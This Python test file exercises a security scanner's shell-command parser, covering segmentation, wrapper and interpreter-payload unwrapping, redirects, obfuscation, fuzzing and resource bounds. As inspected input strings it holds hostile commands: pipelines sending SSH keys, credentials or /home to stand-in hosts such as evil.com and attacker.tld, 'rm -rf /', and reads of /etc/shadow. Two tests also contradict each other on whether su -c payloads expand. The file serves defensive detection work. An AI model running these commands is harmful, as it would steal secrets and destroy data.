"""Structured shell-command parser: parse_command().

The parser sits on a scan path, so the load-bearing properties are not just
"does it parse the happy case" but "can any input make it raise, hang, or grow
without bound". Those get as much coverage here as the parsing itself.

Corpus note: tests read tests/fixtures/shell_corpus.json BY PATH, so a different
corpus with the same shape can be dropped in without touching this file. No
command in the corpus is ever executed — they are strings under inspection.
"""
from __future__ import annotations

import json
import os
import random
import string
import time

import pytest

from xaidr.scanner.command_parse import (
    _MAX_INPUT_CHARS,
    _MAX_SEGMENTS,
    _MAX_TOKENS_PER_SEGMENT,
    ParsedCommand,
    parse_command,
)

_FIXTURE = os.path.join(os.path.dirname(__file__), "fixtures", "shell_corpus.json")


def _corpus() -> dict:
    with open(_FIXTURE, "r", encoding="utf-8") as fh:
        return json.load(fh)


CORPUS = _corpus()
ATTACKS = [e["command"] for e in CORPUS["attacks"]]
BENIGN = [e["command"] for e in CORPUS["benign"]]
ALL_COMMANDS = ATTACKS + BENIGN


# ── (a) the whole corpus parses, never raises, always yields a segment ────────

def test_corpus_shape_matches_declared_counts():
    """Self-consistency, plus a floor so the corpus cannot silently shrink.

    The counts are read from the file rather than hardcoded, so merging in more
    commands does not require editing this test — but the floors mean losing
    coverage does.
    """
    assert len(ATTACKS) == CORPUS["counts"]["attacks"]
    assert len(BENIGN) == CORPUS["counts"]["benign"]
    # Floors: the merge of the original (154 attacks / 42 benign) with the
    # authored set. The benign set is the false-positive gate and must not shrink.
    assert len(ATTACKS) >= 281, f"attack corpus shrank to {len(ATTACKS)}"
    assert len(BENIGN) >= 74, f"benign corpus shrank to {len(BENIGN)}"


def test_no_command_is_both_an_attack_and_benign():
    """Cross-section dedup CHECK (not an auto-fix).

    The merge deduped within each section but never across them, which let
    `uname -a` sit in both the discovery attacks and the benign gate at once. A
    command cannot be both the thing we detect and the thing that proves we do
    not over-detect; whichever way such an entry resolves, it makes one of the
    two measurements a lie. This fails loudly rather than silently picking a
    side.
    """
    attacks = {e["command"] for e in CORPUS["attacks"]}
    benign = set(BENIGN)
    collisions = sorted(attacks & benign)
    assert collisions == [], (
        f"{len(collisions)} command(s) appear in BOTH sections: {collisions}. "
        "Decide which section owns each one; do not leave it in both."
    )


def test_no_duplicate_commands_within_a_section():
    """The within-section dedup the merge did claim to do."""
    for section in ("attacks", "benign"):
        cmds = [e["command"] for e in CORPUS[section]]
        dupes = sorted({c for c in cmds if cmds.count(c) > 1})
        assert dupes == [], f"duplicate commands within {section}: {dupes}"


def test_every_attack_entry_carries_provenance_and_class():
    classes = set(CORPUS["_schema"]["classes"])
    for e in CORPUS["attacks"]:
        assert e["class"] in classes, f"unknown class {e['class']!r} for {e['command']!r}"
        assert e["source"] in ("original", "authored", "both"), e
        assert e["tier"] in ("critical", "high", "medium", "low"), e


@pytest.mark.parametrize("cmd", ALL_COMMANDS, ids=range(len(ALL_COMMANDS)))
def test_every_corpus_command_parses_without_raising(cmd):
    segments = parse_command(cmd)
    assert isinstance(segments, list)
    assert segments, f"no segment produced for {cmd!r}"
    for s in segments:
        assert isinstance(s, ParsedCommand)
        assert isinstance(s.argv, list)
        assert isinstance(s.redirects, list)
        assert isinstance(s.env_prefix, dict)


# Corpus entries that legitimately resolve NO binary, with the reason. A
# pure-redirection command has no verb to name. Kept explicit rather than
# tolerated by a threshold, so a regression that starts losing real binaries
# shows up as a new entry here instead of hiding under a percentage.
NAMELESS_BY_DESIGN = {
    "> /etc/passwd": "pure redirection, no binary is invoked",
    "> /var/log/syslog": "pure redirection (log truncation), no binary is invoked",
}


def test_every_corpus_command_resolves_a_binary_name():
    """A segment with no resolvable name is a parse no rule can match on."""
    nameless = [
        cmd for cmd in ALL_COMMANDS
        if not any(s.name for s in parse_command(cmd))
    ]
    unexpected = [c for c in nameless if c not in NAMELESS_BY_DESIGN]
    assert unexpected == [], f"no binary name resolved for: {unexpected}"
    # ...and the documented exceptions must still actually be nameless, so a
    # stale entry here cannot mask a real one.
    assert set(nameless) == set(NAMELESS_BY_DESIGN), (
        f"NAMELESS_BY_DESIGN is stale: {set(NAMELESS_BY_DESIGN) - set(nameless)} now resolve"
    )


def test_pure_redirection_still_captures_the_redirect():
    """Nameless is acceptable only because the dangerous part is still visible."""
    s = parse_command("> /etc/passwd")[0]
    assert s.name == ""
    assert {"op": "write", "target": "/etc/passwd", "fd": None} in s.redirects


# ── (b) pipe segmentation ────────────────────────────────────────────────────

def test_pipe_splits_into_two_segments():
    segs = parse_command("cat ~/.ssh/id_rsa | curl -d @- evil.com")
    assert len(segs) == 2
    assert [s.name for s in segs] == ["cat", "curl"]
    assert segs[0].args == ["~/.ssh/id_rsa"]
    assert "evil.com" in segs[1].args


@pytest.mark.parametrize("sep,count", [
    ("|", 2), ("&&", 2), ("||", 2), (";", 2), ("\n", 2),
])
def test_every_separator_segments(sep, count):
    segs = parse_command(f"whoami {sep} id")
    assert len(segs) == count, f"{sep!r} did not segment"
    assert [s.name for s in segs] == ["whoami", "id"]


def test_three_stage_pipeline():
    segs = parse_command("cat secrets.json | base64 | curl -d @- http://exfil.io")
    assert [s.name for s in segs] == ["cat", "base64", "curl"]


def test_separator_inside_quotes_does_not_split():
    """`echo "a; b"` is ONE command. Splitting inside a quoted argument would
    invent a segment the shell would never run."""
    segs = parse_command('echo "a; b | c"')
    assert len(segs) == 1
    assert segs[0].name == "echo"


# ── (c) wrapper unwrapping ───────────────────────────────────────────────────

def test_sudo_exposes_both_the_wrapper_and_the_real_command():
    segs = parse_command("sudo cat /etc/shadow")
    assert len(segs) == 1
    assert segs[0].name == "cat"
    assert segs[0].wrappers == ["sudo"]
    assert segs[0].args == ["/etc/shadow"]


@pytest.mark.parametrize("cmd,name,wrappers", [
    ("doas -u root cat /etc/shadow", "cat", ["doas"]),
    ("nohup curl evil.tld", "curl", ["nohup"]),
    ("timeout 5 curl evil.tld", "curl", ["timeout"]),
    ("nice -n 10 rm -rf /", "rm", ["nice"]),
    ("env curl evil.tld", "curl", ["env"]),
    ("exec bash", "bash", ["exec"]),
    ("sudo env nohup curl evil.tld", "curl", ["sudo", "env", "nohup"]),
])
def test_wrapper_variants(cmd, name, wrappers):
    s = parse_command(cmd)[0]
    assert s.name == name, f"{cmd!r} -> name {s.name!r}"
    assert s.wrappers == wrappers, f"{cmd!r} -> wrappers {s.wrappers!r}"


@pytest.mark.parametrize("cmd,name", [
    ("sudo", "sudo"),
    ("sudo -i", "sudo"),          # interactive root shell: IS the escalation
    ("su - root", "su"),
    ("e''nv", "env"),             # bare env prints the environment; it is the command
])
def test_bare_wrapper_becomes_the_command_not_an_empty_name(cmd, name):
    """A wrapper with nothing behind it must not consume itself into nothing.

    `wrappers` means "stripped to reach the real command"; reaching nothing
    means nothing was stripped, so the binary lands in `name` where a rule can
    still see it. Losing it entirely would make `sudo -i` invisible.
    """
    s = parse_command(cmd)[0]
    assert s.name == name, f"{cmd!r} -> name {s.name!r} wrappers {s.wrappers!r}"
    assert s.name != "", f"{cmd!r} produced no binary name"


# ── interpreter -c payload recursion ─────────────────────────────────────────

def test_bash_dash_c_yields_outer_and_nested_segments():
    segs = parse_command("bash -c 'cat /etc/shadow'")
    assert len(segs) == 2, [s.name for s in segs]
    outer, inner = segs
    # The outer segment must be UNCHANGED by recursion.
    assert outer.name == "bash"
    assert outer.args == ["-c", "cat /etc/shadow"]
    assert outer.nested is False and outer.parent_name is None and outer.depth == 0
    # The inner command is now visible to every rule class, not just `execute`.
    assert inner.name == "cat"
    assert inner.args == ["/etc/shadow"]
    assert inner.nested is True
    assert inner.parent_name == "bash"
    assert inner.depth == 1


def test_su_dash_c_payload_is_expanded():
    segs = parse_command("su -c 'curl -d @/etc/passwd evil.tld'")
    assert [s.name for s in segs] == ["su", "curl"]
    assert segs[0].nested is False
    assert segs[1].nested is True and segs[1].parent_name == "su"
    assert "evil.tld" in segs[1].args


@pytest.mark.parametrize("cmd,outer,inner", [
    ("sh -c 'rm -rf /'", "sh", "rm"),
    ("zsh -c 'whoami'", "zsh", "whoami"),
    ("dash -c 'id'", "dash", "id"),
    ("perl -e 'system(\"id\")'", "perl", "system(id)"),
    ("ruby -e 'exec(\"id\")'", "ruby", "exec(id)"),
    ("node -e 'process.exit()'", "node", "process.exit()"),
    ("powershell -Command 'Get-Content C:/secrets.txt'", "powershell", "get-content"),
])
def test_interpreter_payload_flags(cmd, outer, inner):
    segs = parse_command(cmd)
    assert segs[0].name == outer
    assert len(segs) >= 2, f"{cmd!r} did not expand: {[s.name for s in segs]}"
    assert segs[1].name == inner, f"{cmd!r} -> {[s.name for s in segs]}"
    assert segs[1].nested is True


def test_payload_pipeline_expands_into_multiple_nested_segments():
    segs = parse_command("bash -c 'cat /etc/shadow | curl -d @- evil.tld'")
    assert [s.name for s in segs] == ["bash", "cat", "curl"]
    assert [s.nested for s in segs] == [False, True, True]
    assert all(s.parent_name == "bash" for s in segs[1:])


# ── the obvious false positive: a non-interpreter -c ─────────────────────────

@pytest.mark.parametrize("cmd", [
    "grep -c pattern file",
    "grep -c 'cat /etc/shadow' access.log",
    "sort -c file.txt",
    "wc -c report.txt",
    "tar -c -f archive.tar dir/",
    "docker -c mycontext ps",
])
def test_non_interpreter_dash_c_is_not_a_payload(cmd):
    """`-c` means count/check/create/context to these — not "run this code".

    Treating it as a payload would invent a command that was never run, which
    is a false positive a rule would then fire on.
    """
    segs = parse_command(cmd)
    assert len(segs) == 1, f"{cmd!r} wrongly expanded: {[s.name for s in segs]}"
    assert segs[0].nested is False


def test_shell_dash_e_is_errexit_not_eval():
    """`-e` is eval for perl/ruby/node but errexit for a POSIX shell.

    A global `-e` payload flag would read `bash -e -c 'x'` as a payload of
    literally "-c" and lose the real command.
    """
    segs = parse_command("bash -e -c 'cat /etc/shadow'")
    assert [s.name for s in segs] == ["bash", "cat"], [s.name for s in segs]
    assert segs[1].args == ["/etc/shadow"]


def test_payload_flag_with_no_value_is_not_a_payload():
    segs = parse_command("bash -c")
    assert len(segs) == 1 and segs[0].name == "bash"


# ── depth cap ────────────────────────────────────────────────────────────────

def test_depth_cap_expands_two_levels_then_stops():
    from xaidr.scanner.command_parse import _MAX_PAYLOAD_DEPTH

    assert _MAX_PAYLOAD_DEPTH == 2
    segs = parse_command("""bash -c "sh -c 'cat /etc/shadow'" """)
    names = [s.name for s in segs]
    assert names == ["bash", "sh", "cat"], names
    assert [s.depth for s in segs] == [0, 1, 2]
    assert [s.nested for s in segs] == [False, True, True]


def test_third_level_payload_is_not_expanded_and_is_marked_degraded():
    cmd = """bash -c "sh -c \\"bash -c 'cat /etc/shadow'\\"" """
    segs = parse_command(cmd)
    assert all(s.depth <= 2 for s in segs), [(s.name, s.depth) for s in segs]
    deepest = [s for s in segs if s.depth == 2]
    assert deepest, f"expected a depth-2 segment: {[(s.name, s.depth) for s in segs]}"
    assert any(s.parse_degraded for s in deepest), (
        "unexpanded payload at the depth cap must be reported as degraded"
    )


# ── base64 -EncodedCommand ───────────────────────────────────────────────────

def test_encoded_command_is_decoded_when_trivially_decodable():
    import base64

    payload = "cat /etc/shadow"
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
    segs = parse_command(f"powershell -EncodedCommand {b64}")
    assert segs[0].name == "powershell"
    assert any(s.name == "cat" and s.nested for s in segs), [s.name for s in segs]


def test_undecodable_encoded_command_is_flagged_not_guessed():
    segs = parse_command("powershell -EncodedCommand !!!!not-base64!!!!")
    assert segs[0].name == "powershell"
    assert segs[0].expands is True or segs[0].parse_degraded is True
    assert all(not s.nested for s in segs), "an undecodable blob must not be invented into commands"


# ── non-shell payloads are approximate and say so ────────────────────────────

def test_non_shell_payload_segments_are_marked_degraded():
    """Shell-tokenizing Python source is an approximation, not a clean parse.

    The segments are still emitted (the inner shell string is often the point),
    but marked so a rule can weigh them accordingly.
    """
    segs = parse_command("python3 -c \"import os;os.system('id')\"")
    assert segs[0].name == "python3"
    nested = [s for s in segs if s.nested]
    assert nested, "python payload was not expanded"
    assert all(s.parse_degraded for s in nested), (
        "non-shell payload segments must be marked approximate"
    )


def test_shell_payload_segments_are_not_marked_degraded():
    segs = parse_command("bash -c 'cat /etc/shadow'")
    assert all(not s.parse_degraded for s in segs)


# ── recursion cannot break the existing guarantees ───────────────────────────

def test_recursive_payloads_never_raise_and_stay_bounded():
    hostile = [
        "bash -c " + "'bash -c " * 50 + "'cat /etc/shadow'" + "'" * 50,
        "bash -c '" + "a" * 20000 + "'",
        "bash -c '" + " | ".join(["whoami"] * 200) + "'",
        "powershell -EncodedCommand " + "A" * 10000,
        "bash -c \"unterminated",
        "python3 -c ''",
    ]
    for cmd in hostile:
        segs = parse_command(cmd)
        assert isinstance(segs, list)
        assert len(segs) <= _MAX_SEGMENTS, f"{len(segs)} segments for {cmd[:40]!r}"
        assert all(s.depth <= 2 for s in segs)


# ── (d) env prefix ───────────────────────────────────────────────────────────

def test_su_is_not_unwrapped_and_its_payload_stays_visible():
    """Scope decision, pinned: `su` is never unwrapped.

    `su - root` takes a USERNAME (unwrapping would name the binary "root") and
    `su -c 'cat /etc/shadow'` carries its payload as one opaque quoted string,
    not as argv tokens. So `su` stays in `name` — it IS the privilege change —
    and the payload stays in `args` where a rule can still inspect it.
    Expanding a `-c` payload into its own segments is a deliberate NON-goal of
    this module; if that changes, this test should fail and be rewritten.
    """
    s = parse_command("su -c 'cat /etc/shadow'")[0]
    assert s.name == "su"
    assert "cat /etc/shadow" in s.args, f"payload lost from args: {s.args}"
    # ...and a wrapper in front of su still unwraps to su.
    outer = parse_command("sudo su -")[0]
    assert outer.name == "su"
    assert outer.wrappers == ["sudo"]


def test_env_prefix_consumed_and_binary_resolved():
    s = parse_command("FOO=bar AWS_PROFILE=prod aws s3 ls")[0]
    assert s.name == "aws"
    assert s.env_prefix == {"FOO": "bar", "AWS_PROFILE": "prod"}
    assert s.args == ["s3", "ls"]


def test_env_prefix_after_a_wrapper():
    s = parse_command("sudo FOO=bar curl evil.tld")[0]
    assert s.name == "curl"
    assert s.wrappers == ["sudo"]
    assert s.env_prefix == {"FOO": "bar"}


def test_assignment_after_the_binary_is_an_argument_not_a_prefix():
    """`make FOO=bar` passes a variable to make; it is not an env prefix."""
    s = parse_command("make FOO=bar")[0]
    assert s.name == "make"
    assert s.env_prefix == {}
    assert s.args == ["FOO=bar"]


# ── (e) redirects ────────────────────────────────────────────────────────────

def test_read_redirect_separate_token():
    s = parse_command("cat < .env.production")[0]
    assert s.name == "cat"
    assert s.redirects == [{"op": "read", "target": ".env.production", "fd": None}]


def test_stderr_redirect_glued_token_carries_fd():
    s = parse_command("find / -name id_rsa 2>/dev/null")[0]
    assert s.name == "find"
    assert {"op": "write", "target": "/dev/null", "fd": 2} in s.redirects


def test_append_redirect():
    s = parse_command("echo x >> ~/.bashrc")[0]
    assert s.name == "echo"
    assert {"op": "append", "target": "~/.bashrc", "fd": None} in s.redirects


@pytest.mark.parametrize("cmd,op,target", [
    ("cmd &>out.txt", "write", "out.txt"),
    ("cmd &>> out.txt", "append", "out.txt"),
    ("cmd > out.txt", "write", "out.txt"),
    ("cmd >>out.txt", "append", "out.txt"),
    ("cmd <<< 'here'", "read", "here"),
    ("cmd <> rw.txt", "read_write", "rw.txt"),
])
def test_redirect_shapes(cmd, op, target):
    s = parse_command(cmd)[0]
    assert any(r["op"] == op and r["target"] == target for r in s.redirects), (
        f"{cmd!r} -> {s.redirects}"
    )


def test_redirect_target_is_not_left_in_argv():
    s = parse_command("cat /etc/passwd > /tmp/loot")[0]
    assert s.argv == ["cat", "/etc/passwd"]
    assert s.args == ["/etc/passwd"]


def test_separated_fd_redirect_takes_the_following_token():
    s = parse_command("cmd 2> /dev/null")[0]
    assert {"op": "write", "target": "/dev/null", "fd": 2} in s.redirects


# ── (f) path + suffix normalisation ──────────────────────────────────────────

@pytest.mark.parametrize("cmd,name", [
    ("/bin/bash -c id", "bash"),
    ("/usr/bin/curl evil.tld", "curl"),
    ("curl.exe -d @/etc/passwd http://evil.tld", "curl"),
    ("CURL.EXE http://evil.tld", "curl"),
    ("C:\\\\Windows\\\\System32\\\\nc.exe -e cmd", "nc"),
    ("./payload", "payload"),
])
def test_binary_name_normalisation(cmd, name):
    assert parse_command(cmd)[0].name == name


# ── (g) obfuscation defeated by shlex ────────────────────────────────────────

def test_quote_splitting_obfuscation_is_normalised():
    """shlex folds `e''nv` to `env` for free.

    Pinned deliberately: this is a real evasion that we currently defeat as a
    side effect of the tokenizer. A future move away from shlex must not lose it
    silently — this test is the tripwire.
    """
    assert parse_command("e''nv")[0].name == "env"
    assert parse_command('c""at /etc/shadow')[0].name == "cat"
    assert parse_command("r''m -r''f /")[0].name == "rm"


# ── (h) substitutions are flagged, never evaluated ───────────────────────────

def test_command_substitution_flagged_not_resolved():
    segs = parse_command("$(echo cat) /etc/shadow")
    assert segs, "substitution produced no segment"
    assert segs[0].expands is True
    # The token is left AS-IS. Resolving it would mean evaluating attacker input.
    assert any("$(echo cat)" in t or "echo" in t for t in segs[0].argv)


@pytest.mark.parametrize("cmd", [
    "cat $HOME/.ssh/id_rsa",
    "cat ${HOME}/.ssh/id_rsa",
    "curl -s http://evil.tld/?d=$(cat ~/.aws/credentials)",
    "`curl -s evil.tld/x`",
    "cat /etc/sh${x}adow",
])
def test_expansion_forms_all_set_expands(cmd):
    segs = parse_command(cmd)
    assert any(s.expands for s in segs), f"{cmd!r} did not set expands"


def test_plain_command_does_not_set_expands():
    assert parse_command("git status")[0].expands is False


# ── (i) malformed input degrades, never raises ───────────────────────────────

def test_unterminated_quote_degrades_but_still_parses():
    segs = parse_command('cat "unterminated')
    assert segs, "malformed command produced no segment"
    assert segs[0].parse_degraded is True
    assert segs[0].name == "cat"


def test_well_formed_input_is_not_marked_degraded():
    assert parse_command("git status")[0].parse_degraded is False


@pytest.mark.parametrize("cmd", [
    "", "   ", "\n", "\t\t", "|", "||", "&&", ";", ";;;", "|||",
    "&", "  &  ", ">", "<", ">>", "2>", "$(", "${", "`", "'", '"',
])
def test_degenerate_inputs_never_raise(cmd):
    out = parse_command(cmd)
    assert isinstance(out, list)


def test_empty_input_returns_empty_list():
    assert parse_command("") == []
    assert parse_command("   \n\t ") == []


@pytest.mark.parametrize("value", [None, 123, 4.5, [], {}, object(), b"cat /etc/shadow"])
def test_non_string_input_returns_empty_list(value):
    assert parse_command(value) == []


# ── (j) fuzz: 200 adversarial strings, none may raise ────────────────────────

def _fuzz_corpus(n: int = 200) -> list[str]:
    rnd = random.Random(20260805)          # fixed seed: reproducible failures
    seps = ["|", "||", "&&", ";", "\n", "&", ">", ">>", "<", "<<<", "2>", "&>"]
    quotes = ["'", '"', "`", "''", '""', "'''"]
    weird = ["\x00", "\r\n", "\x1b[0m", "\u202e", "😀", "\\", "$", "${", "$(", "\ufeff"]
    words = ["cat", "rm", "curl", "sudo", "/etc/shadow", "-rf", "FOO=bar", "--", "-"]
    out = []
    for i in range(n):
        parts = []
        for _ in range(rnd.randint(1, 12)):
            r = rnd.random()
            if r < 0.35:
                parts.append(rnd.choice(words))
            elif r < 0.55:
                parts.append(rnd.choice(seps))
            elif r < 0.72:
                parts.append(rnd.choice(quotes))
            elif r < 0.88:
                parts.append(rnd.choice(weird))
            else:
                parts.append("".join(rnd.choice(string.printable) for _ in range(rnd.randint(1, 40))))
        s = rnd.choice([" ", "", "\t"]).join(parts)
        if i % 17 == 0:                     # a long-token case
            s += " " + "A" * rnd.randint(500, 5000)
        if i % 23 == 0:                     # a deep-nesting case
            s = "$(" * 50 + s + ")" * 50
        out.append(s)
    return out


FUZZ = _fuzz_corpus()


def test_fuzz_never_raises():
    failures = []
    for s in FUZZ:
        try:
            out = parse_command(s)
            assert isinstance(out, list)
            for seg in out:
                assert isinstance(seg, ParsedCommand)
        except Exception as exc:            # noqa: BLE001 — the assertion IS "never raises"
            failures.append((s[:80], repr(exc)))
    assert failures == [], f"{len(failures)} fuzz input(s) raised: {failures[:3]}"


def test_fuzz_corpus_is_actually_adversarial():
    """Guard the guard: a fuzz set of only benign strings proves nothing."""
    assert len(FUZZ) == 200
    assert any("\x00" in s for s in FUZZ), "no null bytes in fuzz set"
    assert any(len(s) > 500 for s in FUZZ), "no long inputs in fuzz set"
    assert any(s.count("$(") > 10 for s in FUZZ), "no deep nesting in fuzz set"
    degraded = sum(1 for s in FUZZ for seg in parse_command(s) if seg.parse_degraded)
    assert degraded > 0, "no fuzz input exercised the degraded path"


# ── (k) bounds ───────────────────────────────────────────────────────────────

def test_input_at_the_cap_is_handled_promptly():
    cmd = "cat " + "a" * (_MAX_INPUT_CHARS - 10)
    t0 = time.perf_counter()
    segs = parse_command(cmd)
    elapsed = time.perf_counter() - t0
    assert segs and segs[0].name == "cat"
    assert elapsed < 1.0, f"took {elapsed:.3f}s at the input cap"


def test_input_beyond_the_cap_is_truncated_and_marked_degraded():
    cmd = "cat " + "b" * (_MAX_INPUT_CHARS * 4)
    t0 = time.perf_counter()
    segs = parse_command(cmd)
    elapsed = time.perf_counter() - t0
    assert segs, "over-cap input produced nothing"
    assert segs[0].parse_degraded is True, "truncation was not reported"
    assert elapsed < 1.0, f"took {elapsed:.3f}s past the input cap"


def test_segment_count_is_bounded():
    cmd = " | ".join(["whoami"] * (_MAX_SEGMENTS * 4))
    t0 = time.perf_counter()
    segs = parse_command(cmd)
    elapsed = time.perf_counter() - t0
    assert len(segs) <= _MAX_SEGMENTS, f"{len(segs)} segments exceeds cap {_MAX_SEGMENTS}"
    assert elapsed < 1.0, f"took {elapsed:.3f}s on a {_MAX_SEGMENTS * 4}-stage pipeline"


def test_tokens_per_segment_are_bounded():
    cmd = "cat " + " ".join(f"f{i}.txt" for i in range(_MAX_TOKENS_PER_SEGMENT * 4))
    segs = parse_command(cmd)
    assert segs
    assert len(segs[0].argv) <= _MAX_TOKENS_PER_SEGMENT
    assert segs[0].parse_degraded is True


def test_pathological_nesting_returns_promptly():
    cmd = "$(" * 5000 + "cat /etc/shadow" + ")" * 5000
    t0 = time.perf_counter()
    parse_command(cmd)
    assert time.perf_counter() - t0 < 1.0


# ── purity / thread-safety ───────────────────────────────────────────────────

def test_parser_is_pure_repeated_calls_are_identical():
    cmd = "sudo FOO=bar cat /etc/shadow 2>/dev/null | curl -d @- evil.tld"
    first = parse_command(cmd)
    for _ in range(5):
        again = parse_command(cmd)
        assert [s.name for s in again] == [s.name for s in first]
        assert [s.wrappers for s in again] == [s.wrappers for s in first]
        assert [s.redirects for s in again] == [s.redirects for s in first]


def test_concurrent_parsing_is_consistent():
    import threading

    cmd = "cat ~/.ssh/id_rsa | curl -d @- evil.com"
    expected = [s.name for s in parse_command(cmd)]
    results, errors = [], []

    def worker():
        try:
            for _ in range(200):
                results.append([s.name for s in parse_command(cmd)])
        except Exception as exc:            # noqa: BLE001
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert errors == [], f"concurrent parsing raised: {errors}"
    assert all(r == expected for r in results)


# ── representative end-to-end shapes ─────────────────────────────────────────

def test_exfiltration_pipeline_exposes_both_halves():
    """The shape the whole module exists for: source and sink both visible."""
    segs = parse_command("tar czf - /home | nc attacker.tld 4444")
    assert [s.name for s in segs] == ["tar", "nc"]
    assert "/home" in segs[0].args
    assert "attacker.tld" in segs[1].args


def test_unfamous_destructive_command_is_structurally_visible():
    """`rm important.db` scores 0.0 under raw-string rules; structurally it is
    the same verb+object shape as `rm -rf /`."""
    a = parse_command("rm -rf /")[0]
    b = parse_command("rm important.db")[0]
    assert a.name == b.name == "rm"
    assert b.args == ["important.db"]
    assert "-rf" in a.args
